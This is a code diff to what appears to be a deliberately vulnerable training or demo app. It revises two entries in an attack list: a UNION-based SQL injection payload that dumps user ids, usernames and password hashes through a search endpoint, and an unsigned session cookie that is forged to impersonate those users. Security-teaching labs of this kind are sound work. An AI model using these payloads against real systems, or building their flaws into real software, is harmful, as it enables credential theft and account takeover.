@@ -41,9 +41,9 @@ const ATTACKS: Attack[] = [
     id: "sqli-union",
     title: "SQL injection — dump the users table",
     description:
-      "The search term is concatenated into the query. A UNION payload pulls every username and password hash out of the users table and returns them as fake notes.",
+      "The search term is concatenated into the query. A UNION payload pulls every user's id, username and password hash out of the users table and returns them as fake notes (title = username, body = \"id | hash\").",
     defaultPayload:
-      "' UNION SELECT id::text, username, password_hash, now(), now() FROM users --",
+      "' UNION SELECT NULL, username, id::text || ' | ' || password_hash, now(), now() FROM users --",
     run: (p) => raw("GET", `/api/notes/search?q=${encodeURIComponent(p)}`),
   },
   {
@@ -58,7 +58,7 @@ const ATTACKS: Attack[] = [
     id: "session-forge",
     title: "Broken auth — forge the session cookie",
     description:
-      "The session cookie is just  uid=<id>  with no signature, and it is not HttpOnly. Paste any user id to become that user; the button then calls /api/auth/me.",
+      "The session cookie is just  uid=<id>  with no signature, and it is not HttpOnly. Copy a real user id from the SQL injection dump above, paste it here, and the button sets the cookie and calls /api/auth/me as that user.",
     defaultPayload: "00000000-0000-0000-0000-000000000000",
     run: async (p) => {
       document.cookie = `uid=${p}; Path=/; SameSite=None; Secure`;
